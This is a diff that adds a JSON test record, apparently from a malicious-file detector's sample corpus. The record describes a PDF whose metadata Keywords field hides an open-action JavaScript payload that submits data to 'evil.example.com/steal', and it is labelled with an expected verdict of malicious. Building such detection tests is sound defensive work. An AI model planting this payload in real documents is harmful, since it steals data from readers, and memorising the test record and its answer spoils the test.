@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-pdf::30::binary-variations::4",
+  "base_sample_id": "exp::document-pdf::30",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -292632420,
+  "content": "{\n  \"format\": \"pdf\",\n  \"info\": {\n    \"Keywords\": \"/AA << /O << /S /JavaScript /JS (this.submitForm(\\\"http://evil.example.com/steal\\\")) >> >>\\n\",\n    \"Creator\": \"Microsoft Word\",\n    \"Producer\": \"macOS Quartz PDFContext\",\n    \"CreationDate\": \"D:20260115103000Z\"\n  }\n}",
+  "content_hash": "dbb97c30928e89ad04771fcaf8209811cef85632273d3548dce6aeb906994f31",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-metadata",
+  "difficulty": "advanced"
+}
